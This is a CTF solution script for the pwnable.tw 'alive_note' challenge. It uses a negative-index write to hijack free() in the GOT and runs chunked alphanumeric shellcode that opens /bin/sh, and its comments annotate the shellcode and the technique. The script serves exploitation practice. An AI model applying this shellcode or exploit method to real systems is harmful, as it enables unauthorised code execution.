from pwn import *

local = False

if local:
	r = process("./alive_note")
else:
	r = remote("chall.pwnable.tw", 10300)
r.recvuntil("Your choice :")

def add(index, value):
	r.sendline("1")
	r.recvuntil("Index :")
	r.sendline(str(index))
	r.recvuntil("Name :")
	r.send(value)
	r.recvuntil("Your choice :")
def show(index):
	r.sendline("2")
	r.recvuntil("Index :")
	r.sendline(str(index))
	return r.recvuntil("Your choice :")
def delete(index):
	r.sendline("3")
	r.recvuntil("Index :")
	r.sendline(str(index))
	r.recvuntil("Your choice :")

def jumping():
	add(-1, "\n")
	add(-1, "\n")
	add(-1, "\n")

shellcode = "f5A0IIf5W2R0H0IIII0H1hC002X5lCX2Ph0binXHPTZSSSRTUVWaj2X493z"

add(0, shellcode[0:6] + "\x75\x38")
jumping()
add(1, shellcode[6:0xb] + "\x75\x39")
jumping()
add(2, shellcode[0xb:0x10] + "\x75\x39")
jumping()
add(3, shellcode[0x10:0x15] + "\x75\x39")
jumping()
add(4, shellcode[0x15:0x1b] + "\x75\x38")
jumping()
add(5, shellcode[0x1b:0x21] + "\x75\x38")
jumping()
add(6, shellcode[0x21:0x27] + "\x75\x38")
jumping()
add(7, shellcode[0x27:0x2d] + "\x75\x38")
jumping()
add(8, shellcode[0x2d:0x33] + "\x75\x38")
jumping()
add(9, shellcode[0x33:0x3b])

delete(0)
add(-27, shellcode[0:6] + "\x75\x38")
#delete(-27)
r.sendline("3")
r.recvuntil("Index :")
r.sendline("-27")
r.interactive()

'''
# we choose free() in .got because it's argument hold addr of our shellcode (or heap+0x8)
# This is where the shellcode from
0:  66 35 41 30             xor    ax,0x3041   # eax hold addr of shellcode. This XOR to make eax+0x30 point to "cd" byte in "cd80" (int 0x80)
4:  49                      dec    ecx         # ax = ah + al. ax hole 2 last bytes of eax
5:  49                      dec    ecx         # 0xfe ^ 0x33 = 0xcd

6:  66 35 57 32             xor    ax,0x3257
a:  52                      push   edx         # make this payload contain 5byte, because if we send payload 4byte, we can use `jne` instruction

b:  30 48 30                xor    BYTE PTR [eax+0x30],cl
e:  49                      dec    ecx
f:  49                      dec    ecx

10: 49                      dec    ecx
11: 49                      dec    ecx         # 0xfa ^ 0x7a = 0x80
12: 30 48 31                xor    BYTE PTR [eax+0x31],cl

15: 68 43 30 30 32          push   0x32303043  
1a: 58                      pop    eax

1b: 35 6c 43 58 32          xor    eax,0x3258436c  # eax = "/sh\x00"[::-1].encode("hex")
20: 50                      push   eax

21: 68 30 62 69 6e          push   0x6e696230
26: 58                      pop    eax

27: 48                      dec    eax          # eax = 0x6e69622f ("nib/)
28: 50                      push   eax          
29: 54                      push   esp          # esp = addr("/bin/sh")
2a: 5a                      pop    edx          # edx = esp
2b: 53                      push   ebx          # push 0 to make eax = 0 when popad
2c: 53                      push   ebx          # push 0 to make ecx = 0 when popad

2d: 53                      push   ebx          # push 0 to make edx = 0 when popad
2e: 52                      push   edx          # push addr of shellcode to make ebx = edx when popad
2f: 54                      push   esp
30: 55                      push   ebp
31: 56                      push   esi
32: 57                      push   edi

33: 61                      popa                # pop edi, esi, ebp, esp, ebx, edx, ecx, eax  ==> pop to all register
34: 6a 32                   push   0x32
36: 58                      pop    eax
37: 34 39                   xor    al,0x39      # make eax = 0xb
39: 33                      .byte 0x33          # will become 0xcd
3a: 7a                      .byte 0x7a          # will become 0x80
'''

'''
1/ Handle /bin/sh ==> encode shellcode
Ref: https://blog.zespre.com/2015/01/21/alnum-writeup.html?fbclid=IwAR2CQb-R2EFecNn_UDy-JLVd9jlG7kcm9M_0OQXdgchulrn9sUP1JMxj-bg
2/ 'pop ebx' NOT alnum ==> popad
3/ int 0x80 ==> xor BYTE PTR [eax+0x31],cl
4/ shellcode + jumping < 80 byte  ==> I'll bypass this in second solution
5/ Require: a register hole addr of shellcode to change 2 byte of 'int 0x80'
6/ shellcode jumping: jne 0x3a : \x75\x38
7/ jne because ZF=0, not being set by cmp eax, eax (for example) 
'''
